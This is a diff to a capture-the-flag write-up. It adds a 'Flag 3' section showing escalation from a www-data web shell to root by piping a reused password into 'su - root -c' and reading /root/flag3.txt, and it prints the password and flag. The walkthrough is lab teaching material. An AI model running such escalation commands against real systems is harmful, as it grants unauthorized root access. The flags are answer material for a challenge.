@@ -104,7 +104,7 @@ After checking some of the results, we will eventually find the /data directory,
 
     You got the flag! What a place for a password to be, right? :P
     How much can you do with your new admin account? There must be some way to control the forum. 
-    </code></pre>
+</code></pre>
 
 </details>
 
@@ -159,7 +159,46 @@ cat flag2.txt
 </details>
 
 ## Flag 3
+Let's try escalating then! Why not starting with `sudo`?
 
+```
+www-data@fc1b13fe1365:/var/www# sudo ls /root
+sh: 1: sudo: not found
+```
+
+Unfortunetely, `sudo` doesn't seem to work. How about we simply try to switch user with `su`?
+
+```
+www-data@fc1b13fe1365:/var/www# su 
+Password: su: Authentication failure
+```
+
+Although `su` worked, the terminal doesn't prompt us for the password, maybe there is a way to provide that password in a one-liner?
+
+```
+www-data@fc1b13fe1365:/var/www# echo "thispasswordishuge!" | su - root
+Password:
+www-data@fc1b13fe1365:/var/www#
+```
+
+So this time we got no `Authentication failure`, so lucky us that the owner of this system decided to reuse his password. But if you check the user, it is still the same. Let's see if we can pass any command to that user.
+
+```
+www-data@fc1b13fe1365:/var/www# echo "thispasswordishuge!" | su - root -c "ls"
+Password: flag3.txt
+```
+
+The prompt is definitely a bit weird, but we just listed items on root. Let's also read it with `cat`!
+
+```
+www-data@fc1b13fe1365:/var/www# echo "thispasswordishuge!" | su - root -c "ls; cat flag3.txt"
+Password: flag3.txt
+flag3: plzM477letU5pass
+
+You got the last flag! Wasn't that easy?
+```
+
+Hope you enjoyed this challenge as much as we did!
 
 
 # More Studies
